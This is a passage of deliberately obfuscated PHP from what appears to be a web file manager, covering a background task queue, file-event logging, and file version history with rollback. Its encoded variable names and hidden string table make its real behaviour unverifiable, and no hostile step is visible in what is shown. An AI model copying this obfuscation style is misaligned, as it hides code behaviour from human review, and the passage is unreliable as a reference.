$ÀêŠòúè[175]; $â€³î‰Ä = $ÕëÃ›…Á . sprintf($ÀêŠòúè[1778], $‚×‡¥½¢[$ÀêŠòúè[1689]] * 100) . $ÀêŠòúè[1779]; $½ìœ»¸Ì = $â€³î‰Ä . $‚×‡¥½¢[$ÀêŠòúè[1688]] . $ÀêŠòúè[8] . $‚×‡¥½¢[$ÀêŠòúè[826]] . LNG($ÀêŠòúè[1780]); $Ö‡‰¿Ì = $ÀêŠòúè[12]; if ($‚×‡¥½¢[$ÀêŠòúè[1764]]) { $½ìœ»¸Ì = $â€³î‰Ä . size_format($‚×‡¥½¢[$ÀêŠòúè[1688]]) . $ÀêŠòúè[8] . size_format($‚×‡¥½¢[$ÀêŠòúè[826]]); $Ö‡‰¿Ì = size_format($‚×‡¥½¢[$ÀêŠòúè[1690]]) . $ÀêŠòúè[1781]; } if ($‚×‡¥½¢[$ÀêŠòúè[1105]]) { $‚×‡¥½¢[$ÀêŠòúè[1738]] = $‚×‡¥½¢[$ÀêŠòúè[1105]] . $ÀêŠòúè[63] . $‚×‡¥½¢[$ÀêŠòúè[1738]]; } if ($‚×‡¥½¢[$ÀêŠòúè[1738]]) { $ñÉÑ³ºÇ = $ÀêŠòúè[12]; if ($‚×‡¥½¢[$ÀêŠòúè[1740]]) { $ñÉÑ³ºÇ = $ÀêŠòúè[60] . size_format($‚×‡¥½¢[$ÀêŠòúè[1741]]) . $ÀêŠòúè[8] . size_format($‚×‡¥½¢[$ÀêŠòúè[1740]]); } $Ö‡‰¿Ì .= $‚×‡¥½¢[$ÀêŠòúè[1738]] . $ñÉÑ³ºÇ; } if ($‚×‡¥½¢[$ÀêŠòúè[803]] && !$‚×‡¥½¢[$ÀêŠòúè[1740]]) { $Ö‡‰¿Ì .= $ÀêŠòúè[63] . size_format($‚×‡¥½¢[$ÀêŠòúè[1745]]) . $ÀêŠòúè[8] . size_format($‚×‡¥½¢[$ÀêŠòúè[803]]); } echoLog($½ìœ»¸Ì . $ÀêŠòúè[63] . $Ö‡‰¿Ì, !0); } public function taskEnd($ÆáãËÅƒ) { $ÌëÊ“Õá =& $_SERVER[‚ûòÉ˜ş]; if (!$ÆáãËÅƒ || $this->taskID != $ÆáãËÅƒ[$ÌëÊ“Õá[451]]) { return; } $æ¢‰Ì¶É = $ÆáãËÅƒ ? $ÆáãËÅƒ[$ÌëÊ“Õá[1688]] . $ÌëÊ“Õá[8] . $ÆáãËÅƒ[$ÌëÊ“Õá[826]] . LNG($ÌëÊ“Õá[1780]) . $ÌëÊ“Õá[81] : $ÌëÊ“Õá[12]; echoLog($ÌëÊ“Õá[1782] . $ÆáãËÅƒ[$ÌëÊ“Õá[1584]] . ($ÆáãËÅƒ[$ÌëÊ“Õá[502]] ? $ÌëÊ“Õá[81] . $ÆáãËÅƒ[$ÌëÊ“Õá[502]] : $ÌëÊ“Õá[12]) . $ÌëÊ“Õá[81] . $æ¢‰Ì¶É . $ÌëÊ“Õá[1783] . sprintf($ÌëÊ“Õá[891], timeFloat() - $ÆáãËÅƒ[$ÌëÊ“Õá[1691]]) . $ÌëÊ“Õá[1703]); $this->end(); } public function taskKill($öä§û¼µ) { $§°¥ø³€ =& $_SERVER[‚ûòÉ˜ş]; if (!$öä§û¼µ || $this->taskID != $öä§û¼µ[$§°¥ø³€[451]]) { return; } echoLog($§°¥ø³€[1784] . $öä§û¼µ[$§°¥ø³€[1584]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\121\x75\145\165\x65\x4c\x65\x6e\147\164\150"; const QUEUE_DATA = "\x74\141\163\153\x51\165\145\x75\145\104\141\x74\141"; const QUEUE_TIME = "\x74\x61\x73\x6b\x51\x75\145\x75\145\x4c\x61\163\x74\x52\x75\x6e"; const QUEUE_THREAD = "\x74\x61\163\x6b\121\x75\145\165\x65\124\150\162\145\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ìêüÁ , $Â«êËı¯ = array(), $à–ê¯Š = '', $ÉÜŸ¨Í = '') { $ã»ÏßüÇ =& $_SERVER[‚ûòÉ˜ş]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ÉÜŸ¨Í && array_find_by_field(self::$listData, $ã»ÏßüÇ[104], $ÉÜŸ¨Í)) { return !0; } if ($ÉÜŸ¨Í && array_find_by_field(self::$listDataAdd, $ã»ÏßüÇ[104], $ÉÜŸ¨Í)) { return !0; } self::$listDataAdd[] = array($ã»ÏßüÇ[317] => $ìêüÁ , $ã»ÏßüÇ[1785] => $Â«êËı¯, $ã»ÏßüÇ[502] => $à–ê¯Š, $ã»ÏßüÇ[104] => $ÉÜŸ¨Í); return !0; } public static function addSubmit() { $–©ª˜Öå =& $_SERVER[‚ûòÉ˜ş]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($–©ª˜Öå[1786] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $–©ª˜Öå[12], $–©ª˜Öå[502])), $–©ª˜Öå[195]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($…¨ı¿, $ùÇæ˜¯Ğ = array(), $±½Ó´à = '', $«ß¯ÒÊ¾ = '') { $ßûœÎíô =& $_SERVER[‚ûòÉ˜ş]; if (self::count() >= self::MAX_LENGTH) { return !1; } $î˜ö¿À€ = self::getAll(); if ($«ß¯ÒÊ¾ && array_find_by_field($î˜ö¿À€, $ßûœÎíô[104], $«ß¯ÒÊ¾)) { return !0; } $î˜ö¿À€[] = array($ßûœÎíô[317] => $…¨ı¿, $ßûœÎíô[1785] => $ùÇæ˜¯Ğ, $ßûœÎíô[502] => $±½Ó´à, $ßûœÎíô[104] => $«ß¯ÒÊ¾); self::setAll($î˜ö¿À€); write_log($ßûœÎíô[1786] . $±½Ó´à, $ßûœÎíô[195]); return !0; } public static function run() { $¦…íÛ™Õ =& $_SERVER[‚ûòÉ˜ş]; $æ ›ë–Ü = self::getAll(); $ç “…‚ = array_shift($æ ›ë–Ü); if (!$ç “…‚) { return !1; } self::setAll($æ ›ë–Ü); $Šê…«¶— = timeFloat(); $†—ÒÍºé = $¦…íÛ™Õ[12]; try { $†—ÒÍºé = Hook::apply($ç “…‚[$¦…íÛ™Õ[317]], $ç “…‚[$¦…íÛ™Õ[1785]]); } catch (Exception $ûŒÇÁ†») { write_log($ûŒÇÁ†», $¦…íÛ™Õ[1223]); } $µóÆÇ“ = number_format(timeFloat() - $Šê…«¶—, 3) . $¦…íÛ™Õ[1703]; if ($†—ÒÍºé && is_string($†—ÒÍºé)) { $µóÆÇ“ = $µóÆÇ“ . $¦…íÛ™Õ[1787] . $†—ÒÍºé; } write_log($¦…íÛ™Õ[1788] . $ç “…‚[$¦…íÛ™Õ[502]] . $¦…íÛ™Õ[1789] . $µóÆÇ“, $¦…íÛ™Õ[195]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $°æ™ÖÆ¦ =& $_SERVER[‚ûòÉ˜ş]; $Õ²á€™ = self::threadCount() + 1; if ($Õ²á€™ > 3 || !self::count()) { return; } write_log($°æ™ÖÆ¦[1790] . $Õ²á€™, $°æ™ÖÆ¦[195]); Cache::set(self::QUEUE_THREAD, $Õ²á€™, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($°æ™ÖÆ¦[1791], $°æ™ÖÆ¦[195]); } public static function getKey($‘Û¶Ä‘, $¾êâÃ—É = "\x69\156\164") { $Ìæ¬½Ò· =& $_SERVER[‚ûòÉ˜ş]; Cache::removeMemory($‘Û¶Ä‘); $ƒÛ•™§ = Cache::get($‘Û¶Ä‘); if ($¾êâÃ—É == $Ìæ¬½Ò·[341]) { return $ƒÛ•™§ ? intval($ƒÛ•™§) : 0; } if ($¾êâÃ—É == $Ìæ¬½Ò·[1792]) { return is_array($ƒÛ•™§) ? $ƒÛ•™§ : array(); } return $ƒÛ•™§; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[‚ûòÉ˜ş][1792]); } public static function setAll($öÕ”•Á) { $ŞÃ‰å˜Æ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($öÕ”•Á), $ŞÃ‰å˜Æ); Cache::set(self::QUEUE_DATA, $öÕ”•Á, $ŞÃ‰å˜Æ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto Dß‘ÊïËÕè; a’ÁÃÉå›İ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\x72\143\x65\137\145\166\x65\156\164"; protected $dataAuto = array(array("\143\x72\145\141\x74\145\x54\x69\155\x65", "\164\x69\155\145", "\x69\156\x73\x65\x72\x74", "\146\x75\x6e\x63\x74\151\x6f\156"), array("\144\145\x73\x63", '', "\x69\156\x73\x65\x72\x74\x2c\165\x70\x64\x61\164\x65\54\x73\x65\154\x65\x63\x74", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¦Äª±Àø, $ÊËá ãÚ, $¾ñ¶¸ÜŒ = '') { $È¼íù =& $_SERVER[‚ûòÉ˜ş]; if (!$this->eventSave) { return; } $¡è´†„† = Model($È¼íù[1373])->sourceInfo($¦Äª±Àø); if (!$¡è´†„†) { return !1; } if ($this->isCacheEvent($¡è´†„†, $ÊËá ãÚ)) { return; } if ($¾ñ¶¸ÜŒ && is_string($¾ñ¶¸ÜŒ)) { $¾ñ¶¸ÜŒ = array($È¼íù[1924] => $¾ñ¶¸ÜŒ); } $ ‚¡¿Íö = defined($È¼íù[2106]) ? USER_ID : 0; $æ°óë€¨ = array($È¼íù[467] => $¦Äª±Àø, $È¼íù[2107] => $¡è´†„†[$È¼íù[190]], $È¼íù[2108] => $¡è´†„†[$È¼íù[42]], $È¼íù[559] => !empty($¡è´†„†[$È¼íù[559]]) ? $¡è´†„†[$È¼íù[559]] : $È¼íù[12], $È¼íù[1678] => $ ‚¡¿Íö, $È¼íù[472] => $ÊËá ãÚ, $È¼íù[1680] => $¾ñ¶¸ÜŒ); $this->addSystemLog($ÊËá ãÚ, $æ°óë€¨); unset($æ°óë€¨[$È¼íù[2108]], $æ°óë€¨[$È¼íù[559]]); return $this->add($æ°óë€¨); } private function addSystemLog($®ğ½³èõ, $ğ”îÌäø) { $…ÛãÉ®¡ =& $_SERVER[‚ûòÉ˜ş]; if ($®ğ½³èõ == $…ÛãÉ®¡[2109]) { $®ğ½³èõ = $ğ”îÌäø[$…ÛãÉ®¡[502]][$…ÛãÉ®¡[2110]]; } else { if (in_array($®ğ½³èõ, array($…ÛãÉ®¡[1865], $…ÛãÉ®¡[2111]))) { $®ğ½³èõ = $ğ”îÌäø[$…ÛãÉ®¡[502]][$…ÛãÉ®¡[794]]; } } $îæ²üôÂ = array_merge($ğ”îÌäø, array($…ÛãÉ®¡[2112] => $ğ”îÌäø[$…ÛãÉ®¡[191]], $…ÛãÉ®¡[2113] => $ğ”îÌäø[$…ÛãÉ®¡[2113]])); Hook::trigger($…ÛãÉ®¡[2114], $…ÛãÉ®¡[2115] . $®ğ½³èõ, $ğ”îÌäø); Model($…ÛãÉ®¡[1829])->addLog($…ÛãÉ®¡[2115] . $®ğ½³èõ, $îæ²üôÂ); } private function isCacheEvent($ÚŞÒ“ö¡, $àŠÌ‹üç) { if ($ÚŞÒ“ö¡[$_SERVER[‚ûòÉ˜ş][188]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¿­ÔááÜ, $‰‹àã–) { $×çôåš =& $_SERVER[‚ûòÉ˜ş]; $çæ‹­è = Model($×çôåš[1373])->sourceInfo($¿­ÔááÜ); $ŒòÊ†ÃÖ = array($×çôåš[2110] => $‰‹àã–, $×çôåš[42] => $çæ‹­è[$×çôåš[42]]); return $this->addEvent($¿­ÔááÜ, $×çôåš[2109], $ŒòÊ†ÃÖ); } public function eventFileEdit($†»ëÊ©Í) { $Şîá†’¹ =& $_SERVER[‚ûòÉ˜ş]; $Èû´¯µ = array($Şîá†’¹[2116] => $_SERVER[$Şîá†’¹[2117]], $Şîá†’¹[2118] => strtolower(ACTION)); if (isset($GLOBALS[$Şîá†’¹[7]][$Şîá†’¹[2119]])) { $Èû´¯µ[$Şîá†’¹[2119]] = $Şîá†’¹[98]; } return $this->addEvent($†»ëÊ©Í, $Şîá†’¹[1855], $Èû´¯µ); } public function eventRecycle($§…êÛ, $Ÿ‡ø¡ë£) { return $this->addEvent($§…êÛ, $_SERVER[‚ûòÉ˜ş][2111], $Ÿ‡ø¡ë£); } public function eventRemove($öïù×à) { $ØûÍÁÀ– =& $_SERVER[‚ûòÉ˜ş]; $Ú¯«ÉÖº = Model($ØûÍÁÀ–[1373])->sourceInfo($öïù×à); $ä•Ÿ²ı = $Ú¯«ÉÖº[$ØûÍÁÀ–[42]]; return $this->addEvent($Ú¯«ÉÖº[$ØûÍÁÀ–[190]], $ØûÍÁÀ–[1854], $ä•Ÿ²ı); } public function eventShare($ï…Ã¼, $ı…ÕõìÀ) { return $this->addEvent($ï…Ã¼, $_SERVER[‚ûòÉ˜ş][1865], $ı…ÕõìÀ); } public function eventMove($íÈØ§Ã¹, $–…”ÊÜ†, $¶† •å–) { $Ã•Øñß =& $_SERVER[‚ûòÉ˜ş]; $ÆÎı¹†ô = Model($Ã•Øñß[1373]); $³Ìú²›Ï = $ÆÎı¹†ô->sourceInfo($íÈØ§Ã¹); $Ñ×óÎ„ş = $ÆÎı¹†ô->sourceInfo($–…”ÊÜ†); $™§¼µ¼ = $ÆÎı¹†ô->sourceInfo($¶† •å–); $ÍŠØæ¢ = array($Ã•Øñß[1201] => $–…”ÊÜ†, $Ã•Øñß[2120] => $Ñ×óÎ„ş[$Ã•Øñß[42]], $Ã•Øñß[2097] => !empty($Ñ×óÎ„ş[$Ã•Øñß[559]]) ? $Ñ×óÎ„ş[$Ã•Øñß[559]] : $Ã•Øñß[12], $Ã•Øñß[1202] => $¶† •å–, $Ã•Øñß[2121] => $™§¼µ¼[$Ã•Øñß[42]], $Ã•Øñß[2122] => !empty($™§¼µ¼[$Ã•Øñß[559]]) ? $™§¼µ¼[$Ã•Øñß[559]] : $Ã•Øñß[12]); $this->addEvent($íÈØ§Ã¹, $Ã•Øñß[596], $ÍŠØæ¢); $³Ìú²›Ï = $ÆÎı¹†ô->sourceInfo($íÈØ§Ã¹); $ÍŠØæ¢ = array($Ã•Øñß[191] => $³Ìú²›Ï[$Ã•Øñß[191]], $Ã•Øñß[42] => $³Ìú²›Ï[$Ã•Øñß[42]]); $this->addEvent($–…”ÊÜ†, $Ã•Øñß[2123], $ÍŠØæ¢); } public function eventCopy($ŠÒ¤Õ†¾) { $this->eventCreate($ŠÒ¤Õ†¾, $_SERVER[‚ûòÉ˜ş][594]); } public function eventRename($øÃùÛæÈ, $Êˆç€«•, $úêØå¡Ë) { $–ñÄá®© =& $_SERVER[‚ûòÉ˜ş]; $ìØñ†† = array($–ñÄá®©[1201] => $Êˆç€«•, $–ñÄá®©[1202] => $úêØå¡Ë); return $this->addEvent($øÃùÛæÈ, $–ñÄá®©[1387], $ìØñ††); } public function eventAddComment($óÂşÊ½Ë, $ı„º¼÷Ã) { return $this->addEvent($óÂşÊ½Ë, $_SERVER[‚ûòÉ˜ş][2124], $ı„º¼÷Ã); } public function eventAddDesc($àîî´í, $æ°ìÌÍô) { return $this->addEvent($àîî´í, $_SERVER[‚ûòÉ˜ş][2125], $æ°ìÌÍô); } public function listBySource($ç»¼¶Å) { $ŸÂì¶ º =& $_SERVER[‚ûòÉ˜ş]; $ù±©ç°Ë = Model($ŸÂì¶ º[1373])->sourceInfo($ç»¼¶Å); $Åªˆç¶× = array($ŸÂì¶ º[467] => $ç»¼¶Å); if ($ù±©ç°Ë[$ŸÂì¶ º[461]] == $ŸÂì¶ º[98]) { $ïÁ·‡Òˆ = Model($ŸÂì¶ º[1373])->listSearchChildren($ç»¼¶Å, 20000); $ïÁ·‡Òˆ[] = $ç»¼¶Å . $ŸÂì¶ º[22]; $Åªˆç¶× = array($ŸÂì¶ º[191] => array($ŸÂì¶ º[7], $ïÁ·‡Òˆ)); } $ôåŞÕª† = $this->where($Åªˆç¶×)->order($ŸÂì¶ º[2126])->selectPage(); if ($ôåŞÕª†[$ŸÂì¶ º[419]][$ŸÂì¶ º[420]] == 0) { $ôåŞÕª†[$ŸÂì¶ º[419]][$ŸÂì¶ º[420]] = 1; $ôåŞÕª†[$ŸÂì¶ º[422]] = array(array($ŸÂì¶ º[467] => $ç»¼¶Å, $ŸÂì¶ º[2107] => $ù±©ç°Ë[$ŸÂì¶ º[190]], $ŸÂì¶ º[1678] => $ù±©ç°Ë[$ŸÂì¶ º[503]], $ŸÂì¶ º[472] => $ŸÂì¶ º[2127], $ŸÂì¶ º[473] => $ù±©ç°Ë[$ŸÂì¶ º[225]], $ŸÂì¶ º[1680] => $ŸÂì¶ º[12])); } return $this->eventListParse($ôåŞÕª†, $ç»¼¶Å); } private function eventListParse($Ø€ğ¹, $ ú†€Ãƒ) { $¶§íòèÌ =& $_SERVER[‚ûòÉ˜ş]; $€§ğİş¤ = $Ø€ğ¹[$¶§íòèÌ[422]]; $›™úÆæ = array_to_keyvalue($€§ğİş¤, $¶§íòèÌ[12], $¶§íòèÌ[191]); $Šúº´ç  = array_to_keyvalue($€§ğİş¤, $¶§íòèÌ[12], $¶§íòèÌ[2113]); foreach ($€§ğİş¤ as $§ïÓ¶ˆ) { $„Ü¦½»° = $§ïÓ¶ˆ[$¶§íòèÌ[502]]; if ($§ïÓ¶ˆ[$¶§íòèÌ[43]] == $¶§íòèÌ[596] && isset($„Ü¦½»°[$¶§íòèÌ[1201]])) { $›™úÆæ[] = $„Ü¦½»°[$¶§íòèÌ[1201]] . $¶§íòèÌ[12]; $›™úÆæ[] = $„Ü¦½»°[$¶§íòèÌ[1202]] . $¶§íòèÌ[12]; } if ($§ïÓ¶ˆ[$¶§íòèÌ[43]] == $¶§íòèÌ[2123] && isset($„Ü¦½»°[$¶§íòèÌ[191]])) { $›™úÆæ[] = $„Ü¦½»°[$¶§íòèÌ[191]] . $¶§íòèÌ[12]; } } $›™úÆæ = array_merge($›™úÆæ, $Šúº´ç , array($ ú†€Ãƒ . $¶§íòèÌ[12])); $›™úÆæ = array_unique($›™úÆæ); $±öË¥Å± = array_unique(array_to_keyvalue($€§ğİş¤, $¶§íòèÌ[12], $¶§íòèÌ[1687])); $ğë™º = Model($¶§íòèÌ[575])->userListInfo($±öË¥Å±); $îé¹Åç = Model($¶§íòèÌ[865])->sourceListInfo($›™úÆæ, !0); foreach ($€§ğİş¤ as &$§ïÓ¶ˆ) { if ($§ïÓ¶ˆ[$¶§íòèÌ[43]] == $¶§íòèÌ[596] && isset($§ïÓ¶ˆ[$¶§íòèÌ[502]][$¶§íòèÌ[1201]])) { $§ïÓ¶ˆ[$¶§íòèÌ[502]][$¶§íòèÌ[1201]] = $îé¹Åç[$§ïÓ¶ˆ[$¶§íòèÌ[502]][$¶§íòèÌ[1201]]]; $§ïÓ¶ˆ[$¶§íòèÌ[502]][$¶§íòèÌ[1202]] = $îé¹Åç[$§ïÓ¶ˆ[$¶§íòèÌ[502]][$¶§íòèÌ[1202]]]; } if ($§ïÓ¶ˆ[$¶§íòèÌ[43]] == $¶§íòèÌ[2123] && isset($§ïÓ¶ˆ[$¶§íòèÌ[502]][$¶§íòèÌ[191]])) { $§ïÓ¶ˆ[$¶§íòèÌ[502]][$¶§íòèÌ[191]] = $îé¹Åç[$§ïÓ¶ˆ[$¶§íòèÌ[502]][$¶§íòèÌ[191]]]; } $§ïÓ¶ˆ[$¶§íòèÌ[97]] = $îé¹Åç[$§ïÓ¶ˆ[$¶§íòèÌ[191]]]; $§ïÓ¶ˆ[$¶§íòèÌ[2128]] = $îé¹Åç[$§ïÓ¶ˆ[$¶§íòèÌ[2113]]]; if ($§ïÓ¶ˆ[$¶§íòèÌ[43]] == $¶§íòèÌ[1854]) { $§ïÓ¶ˆ[$¶§íòèÌ[2128]] = $§ïÓ¶ˆ[$¶§íòèÌ[97]]; $§ïÓ¶ˆ[$¶§íòèÌ[2113]] = $§ïÓ¶ˆ[$¶§íòèÌ[2128]][$¶§íòèÌ[191]]; $§ïÓ¶ˆ[$¶§íòèÌ[97]] = !1; $§ïÓ¶ˆ[$¶§íòèÌ[191]] = $¶§íòèÌ[12]; } $§ïÓ¶ˆ[$¶§íòèÌ[2057]] = $ğë™º[$§ïÓ¶ˆ[$¶§íòèÌ[1687]]]; } unset($§ïÓ¶ˆ); $Ø€ğ¹[$¶§íòèÌ[422]] = $€§ğİş¤; return $Ø€ğ¹; } public function removeBySource($éµ¢ûÈ”) { $«£ªòİå = array($_SERVER[‚ûòÉ˜ş][467] => $éµ¢ûÈ”); $this->where($«£ªòİå)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\x72\x63\145\x5f\150\151\163\x74\x6f\162\171"; public function historyCount($–ßû›Ú) { $ˆª›Í¸È =& $_SERVER[‚ûòÉ˜ş]; if (!$–ßû›Ú) { return array(); } if (is_string($–ßû›Ú) || is_int($–ßû›Ú)) { $–ßû›Ú = array($–ßû›Ú); } $›ŞªÇ¨ = array($ˆª›Í¸È[191], $ˆª›Í¸È[1918] => $ˆª›Í¸È[541]); $ƒ†Ô’ = array($ˆª›Í¸È[191] => array($ˆª›Í¸È[7], $–ßû›Ú)); $÷ò®Äü = $this->field($›ŞªÇ¨)->where($ƒ†Ô’)->group($ˆª›Í¸È[191])->select(); return array_to_keyvalue($÷ò®Äü, $ˆª›Í¸È[191], $ˆª›Í¸È[541]); } public function addHistory($¦—üÇ¸, $Ò¡¥¢³­ = '') { $°Ì“™ã =& $_SERVER[‚ûòÉ˜ş]; $şØãŒ€¦ = array($°Ì“™ã[467] => $¦—üÇ¸[$°Ì“™ã[191]], $°Ì“™ã[1678] => isset($¦—üÇ¸[$°Ì“™ã[505]]) ? $¦—üÇ¸[$°Ì“™ã[505]] : $¦—üÇ¸[$°Ì“™ã[503]], $°Ì“™ã[518] => $¦—üÇ¸[$°Ì“™ã[517]], $°Ì“™ã[593] => $¦—üÇ¸[$°Ì“™ã[86]], $°Ì“™ã[2129] => $Ò¡¥¢³­); if ($GLOBALS[$°Ì“™ã[6]][$°Ì“™ã[99]][$°Ì“™ã[1258]] >= 1) { $this->historyAutoClear($şØãŒ€¦[$°Ì“™ã[191]]); $this->add($şØãŒ€¦); } Hook::trigger($°Ì“™ã[2130], $şØãŒ€¦); Model($°Ì“™ã[2131])->eventFileEdit($¦—üÇ¸[$°Ì“™ã[191]]); } private function historyAutoClear($µ—Î¥É¡) { $“áÓÒ‰÷ =& $_SERVER[‚ûòÉ˜ş]; $ı«Âå¯é = Model($“áÓÒ‰÷[810])->get($“áÓÒ‰÷[1280]); $ öé¿Ş— = $GLOBALS[$“áÓÒ‰÷[6]][$“áÓÒ‰÷[99]][$“áÓÒ‰÷[1258]]; $°ş€ÀÓ‚ = $ı«Âå¯é == $“áÓÒ‰÷[1281] ? min(5, $ öé¿Ş—) : $ öé¿Ş—; $°ş€ÀÓ‚ = $°ş€ÀÓ‚ <= 0 ? 0 : $°ş€ÀÓ‚ - 1; if ($°ş€ÀÓ‚ >= 500) { return; } $ò£Î¡ú‘ = array($“áÓÒ‰÷[467] => $µ—Î¥É¡); $´â™É¿‰ = $this->field($“áÓÒ‰÷[2132])->where($ò£Î¡ú‘)->order($“áÓÒ‰÷[2126])->select(); if (!$´â™É¿‰ || $°ş€ÀÓ‚ >= count($´â™É¿‰)) { return; } $ë²­üÔ = array_to_keyvalue($´â™É¿‰, $“áÓÒ‰÷[12], $“áÓÒ‰÷[451]); $ë²­üÔ = array_slice($ë²­üÔ, $°ş€ÀÓ‚); $ó™‚ôÅ— = array_to_keyvalue($´â™É¿‰, $“áÓÒ‰÷[12], $“áÓÒ‰÷[517]); $ó™‚ôÅ— = array_slice($ó™‚ôÅ—, $°ş€ÀÓ‚); if (!$ë²­üÔ || !$ó™‚ôÅ—) { return; } $ò£Î¡ú‘ = array($“áÓÒ‰÷[469] => array($“áÓÒ‰÷[7], $ë²­üÔ)); $this->where($ò£Î¡ú‘)->delete(); Model($“áÓÒ‰÷[520])->remove($ó™‚ôÅ—); } public function listData($¢ÓÈŞè) { $í®ÒåÌÏ =& $_SERVER[‚ûòÉ˜ş]; $İæ’Ø = array($í®ÒåÌÏ[467] => $¢ÓÈŞè); $šü¼Ç±¶ = $í®ÒåÌÏ[2133]; $¸âä Ğ¤ = $this->field($šü¼Ç±¶)->where($İæ’Ø)->order($í®ÒåÌÏ[2126])->selectPage(); $this->_listAppendUser($¸âä Ğ¤[$í®ÒåÌÏ[422]]); $üÌ±ÙÆ¶ = Model($í®ÒåÌÏ[810])->get($í®ÒåÌÏ[1280]); $™äµÉ“Ç = 5; if ($üÌ±ÙÆ¶ == $í®ÒåÌÏ[1281]) { $¸âä Ğ¤[$í®ÒåÌÏ[422]] = array_slice($¸âä Ğ¤[$í®ÒåÌÏ[422]], 0, $™äµÉ“Ç); $¸âä Ğ¤[$í®ÒåÌÏ[419]] = array($í®ÒåÌÏ[2134] => 1, $í®ÒåÌÏ[2135] => 20, $í®ÒåÌÏ[2136] => 1, $í®ÒåÌÏ[2137] => count($¸âä Ğ¤[$í®ÒåÌÏ[422]])); } return $¸âä Ğ¤; } protected function _listAppendUser(&$ºº×õİ) { $’ÇŒÂ£Œ =& $_SERVER[‚ûòÉ˜ş]; $šÅ±Öä = array_to_keyvalue($ºº×õİ, $’ÇŒÂ£Œ[12], $’ÇŒÂ£Œ[1687]); $ÓƒœÃÚ“ = Model($’ÇŒÂ£Œ[575])->userListInfo($šÅ±Öä); foreach ($ºº×õİ as &$›Ø‡†Ûñ) { $ÀÔ¦¿«é = $›Ø‡†Ûñ[$’ÇŒÂ£Œ[1687]]; $›Ø‡†Ûñ[$’ÇŒÂ£Œ[503]] = $ÓƒœÃÚ“[$ÀÔ¦¿«é] ? $ÓƒœÃÚ“[$ÀÔ¦¿«é] : !1; } unset($›Ø‡†Ûñ); } public function fileInfo($¤ô—Ì¶) { $Üê´ú«ü =& $_SERVER[‚ûòÉ˜ş]; $ËÂ›¬éÔ = $this->tablePrefix; $­ıãÕ’œ = "{$ËÂ›¬éÔ}\151\x6f\137\x66\151\154\x65\40\x66\x69\154\x65\x73\x20\x6f\156\x20\146\151\154\145\x73\56\x66\151\x6c\x65\111\x44\40\x3d\40\x68\x69\x73\164\157\162\x79\x2e\x66\151\x6c\145\x49\x44"; return $this->alias($Üê´ú«ü[2138])->where(array($Üê´ú«ü[469] => $¤ô—Ì¶))->join($­ıãÕ’œ, $Üê´ú«ü[2139])->find(); } public function removeItem($ÖşÓÖÃÍ) { $º½úóıÔ =& $_SERVER[‚ûòÉ˜ş]; $Ô¦¸™« = array($º½úóıÔ[469] => $ÖşÓÖÃÍ); $õØì µë = $this->where($Ô¦¸™«)->find(); if ($õØì µë) { $•ø•ŸˆÅ = $this->where($Ô¦¸™«)->delete(); Model($º½úóıÔ[520])->remove($õØì µë[$º½úóıÔ[517]]); return $•ø•ŸˆÅ; } return !1; } public function removeBySource($ïÃ¿û’) { $„–Í¹Ì =& $_SERVER[‚ûòÉ˜ş]; if (!$ïÃ¿û’) { return !1; } if (!is_array($ïÃ¿û’)) { $ïÃ¿û’ = array($ïÃ¿û’); } $½ùº¨§ = array($„–Í¹Ì[467] => array($„–Í¹Ì[7], $ïÃ¿û’)); $Â•ÈÏáõ = $this->field($„–Í¹Ì[518])->where($½ùº¨§)->select(); if ($Â•ÈÏáõ) { $this->where($½ùº¨§)->delete(); $ŸÍØıú´ = array_to_keyvalue($Â•ÈÏáõ, $„–Í¹Ì[12], $„–Í¹Ì[517]); Model($„–Í¹Ì[520])->remove($ŸÍØıú´); } return !0; } public function setDetail($èáûÊÁı, $œÈ­ñ‰‰) { $ßÂ‰ßû =& $_SERVER[‚ûòÉ˜ş]; return $this->where(array($ßÂ‰ßû[469] => $èáûÊÁı))->save(array($ßÂ‰ßû[2129] => $œÈ­ñ‰‰)); } public function rollbackToItem($Ÿ’ç˜Ñ‚, $Çíòí«¿) { $òÇÌã =& $_SERVER[‚ûòÉ˜ş]; $à»şü»Ü = Model($òÇÌã[865])->sourceInfo($Ÿ’ç˜Ñ‚); $this->addHistory($à»şü»Ü, LNG($òÇÌã[2140])); $©É½óğ = $this->find($Çíòí«¿); $¦şºûıÄ = array($òÇÌã[517] => $©É½óğ[$òÇÌã[517]], $òÇÌã[86] => $©É½óğ[$òÇÌã[86]], $òÇÌã[95] => time(), $òÇÌã[505] => USER_ID); Model($òÇÌã[865])->where(array($òÇÌã[191] => $Ÿ’ç˜Ñ‚))->save($¦şºûıÄ); return $this->where(array($òÇÌã[469] => $Çíòí«¿))->delete(); } public function clearSame($Š†Ê¢ƒÎ) { $¢”ıÉö‹ =& $_SERVER[‚ûòÉ˜ş]; $Ñ ÌÂò› = $this->listData($Š†Ê¢ƒÎ); $îçÎĞÔ = array_to_keyvalue_group($Ñ ÌÂò›, $¢”ıÉö‹[517]); $ÃÆ¥ë = array(); $´şÑ›Ó = array(); foreach 